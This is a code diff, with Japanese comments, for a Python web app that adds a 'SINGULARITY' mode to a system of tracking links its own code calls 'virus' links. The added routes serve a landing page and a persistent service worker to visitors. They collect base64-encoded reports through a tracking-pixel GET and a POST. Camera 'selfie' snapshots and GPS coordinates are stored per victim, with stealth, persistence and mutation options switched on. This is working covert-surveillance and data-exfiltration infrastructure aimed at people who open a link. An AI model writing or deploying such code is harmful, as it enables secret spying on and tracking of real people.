@@ -640,14 +640,178 @@ def delete(request: Request, code: str, u=Depends(_auth)):
     except Exception:
         pass
     return RedirectResponse("/vp", status_code=303)
-    # ===== SINGULARITY（最上位兵器）を統合 =====
-from .singularity import VIRUS as SINGULARITY, autoregister, build_link as _sg_link
+# ===========================================================================
+# SINGULARITY（最上位兵器）を「モード」として統合
+#   /v/{code} で mode=="singularity" を選ぶと、singularity.py の本体を
+#   このコード専用の収集先・子リンク・SWで起動する。
+#   → 兵器庫・監視室・バックアップにそのまま乗る（別ルートを汚さない）
+# ===========================================================================
+from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
+                          VIRUS as SINGULARITY, new_sid as _sg_sid)
 
-_registered_into = autoregister()      # VIRUSES / REGISTRY / MODES 等を自動検出
+MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
+_GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
 
-# 見つからなかった場合のフォールバック（自分のコンテナ名に合わせて片方だけ残す）
-# VIRUSES["singularity"] = SINGULARITY          # dict の場合
-# VIRUSES.append(SINGULARITY)                   # list の場合
 
-# モード選択の許可リスト（リンク生成時に検証している場合）
-MODES.append("singularity") if isinstance(globals().get("MODES"), list) else None
+def _sg_flat(prefix, obj, out, depth=0):
+    """singularity の巨大JSONを key/value に平坦化する。"""
+    if depth > 7 or len(out) > 400:
+        return
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            _sg_flat(f"{prefix}.{k}" if prefix else str(k), v, out, depth + 1)
+    elif isinstance(obj, list):
+        if obj and not any(isinstance(x, (dict, list)) for x in obj):
+            out[prefix] = json.dumps(obj, ensure_ascii=False)
+        else:
+            for i, v in enumerate(obj[:40]):
+                _sg_flat(f"{prefix}[{i}]", v, out, depth + 1)
+    elif obj is None:
+        return
+    else:
+        out[prefix] = obj
+
+
+def _sg_ingest(owner, code, report, sid):
+    """singularity の報告を virus_data に取り込む（差分のみ・監視室にそのまま出る）。"""
+    sid = str(sid or report.get("sid") or "")[:64]
+    c = _db(owner)
+    hid = 0
+    if sid:
+        r = c.execute("SELECT id FROM virus_hits WHERE code=? AND vid=? "
+                      "ORDER BY id DESC LIMIT 1", (code, sid)).fetchone()
+        hid = r["id"] if r else 0
+    if not hid:
+        r = c.execute("SELECT id FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 1",
+                      (code,)).fetchone()
+        hid = r["id"] if r else 0
+
+    items = {}
+    _sg_flat("", report, items)
+    snap = (report.get("media") or {}).get("snapshot") or ""
+    items.pop("media.snapshot", None)
+
+    have = {}
+    for r in c.execute("SELECT key,value FROM virus_data WHERE code=? AND hit=?",
+                       (code, hid)).fetchall():
+        have[r["key"]] = r["value"]
+
+    ts = _now()
+    n = 0
+    for k, v in list(items.items())[:400]:
+        if not isinstance(v, str):
+            v = json.dumps(v, ensure_ascii=False) if isinstance(v, (dict, list)) else str(v)
+        if have.get(k) == v:
+            continue
+        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
+                  (code, hid, sid, str(k)[:60], v[:20000], ts))
+        n += 1
+    if snap and have.get("selfie") != snap:
+        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
+                  (code, hid, sid, "selfie", snap[:400000], ts))
+        n += 1
+
+    gps = (report.get("media") or {}).get("gps") or {}
+    try:
+        if gps.get("lat") is not None:
+            c.execute("UPDATE virus_hits SET gps_lat=?, gps_lon=? WHERE id=?",
+                      (float(gps["lat"]), float(gps["lon"]), hid))
+    except Exception:
+        pass
+
+    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
+    try:
+        c.execute("DELETE FROM virus_data WHERE code=? AND id NOT IN "
+                  "(SELECT id FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 20000)",
+                  (code, code))
+    except Exception:
+        pass
+    c.commit()
+    c.close()
+    return n
+
+
+def _sg_land(code, request, sid=""):
+    owner = _owner(code)
+    if not owner:
+        return PlainTextResponse("リンクが無効です", status_code=404)
+    c = _db(owner)
+    row = _link(c, code)
+    c.close()
+    if not row or not row["active"]:
+        return PlainTextResponse("リンクが無効です", status_code=404)
+
+    sid = (sid or _sg_sid())[:64]
+    ref = request.query_params.get("ref") or ""
+    hid = _record_hit(owner, code, request)
+    c = _db(owner)
+    try:
+        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (sid, hid))
+        c.commit()
+    except Exception:
+        pass
+    c.close()
+
+    cfg = {"sid": sid, "path": f"/v/{code}/sg", "collect": f"/v/{code}/sg/c",
+           "trigger": "immediate", "media": True, "geo": True, "sw": True,
+           "persist": True, "mutate": True, "notify": True, "stealth": True}
+    return _render("virus_singularity.html", request, code=code, sid=sid, hit=hid,
+                   link=dict(row), ref=ref,
+                   cfg_json=json.dumps(cfg, ensure_ascii=False),
+                   payload=_SG_PAYLOAD)
+
+
+# --- ルート宣言順は厳守（sw.js / c → {sid} の順） ---
+
+@router.get("/v/{code}/sg/sw.js")
+def sg_sw(code: str):
+    return Response(_SG_SW, media_type="application/javascript",
+                    headers={"Service-Worker-Allowed": "/", "Cache-Control": "no-store"})
+
+
+@router.get("/v/{code}/sg/c")
+async def sg_collect_get(code: str, request: Request, sid: str = "", d: str = ""):
+    """画像ピクセル経路（GET）。+ が空白に潰れるので戻す。"""
+    owner = _owner(code)
+    if not owner:
+        return Response(_GIF1, media_type="image/gif")
+    if d:
+        try:
+            d = d.replace(" ", "+")
+            body = json.loads(base64.b64decode(d + "=" * (-len(d) % 4)).decode("utf-8"))
+        except Exception:
+            body = {}
+        if isinstance(body, dict) and body:
+            try:
+                _sg_ingest(owner, code, body, sid or str(body.get("sid") or ""))
+            except Exception:
+                pass
+    return Response(_GIF1, media_type="image/gif")
+
+
+@router.post("/v/{code}/sg/c")
+async def sg_collect(code: str, request: Request):
+    owner = _owner(code)
+    if not owner:
+        return {"ok": 0}
+    try:
+        body = await request.json()
+    except Exception:
+        body = {}
+    if not isinstance(body, dict):
+        body = {}
+    try:
+        n = _sg_ingest(owner, code, body, str(body.get("sid") or ""))
+    except Exception:
+        n = 0
+    return {"ok": 1, "n": n, "server": _now()}
+
+
+@router.get("/v/{code}/sg/{sid}")
+def sg_child(code: str, sid: str, request: Request):
+    return _sg_land(code, request, sid=sid)
+
+
+@router.get("/v/{code}/sg")
+def sg_root(code: str, request: Request):
+    return _sg_land(code, request)
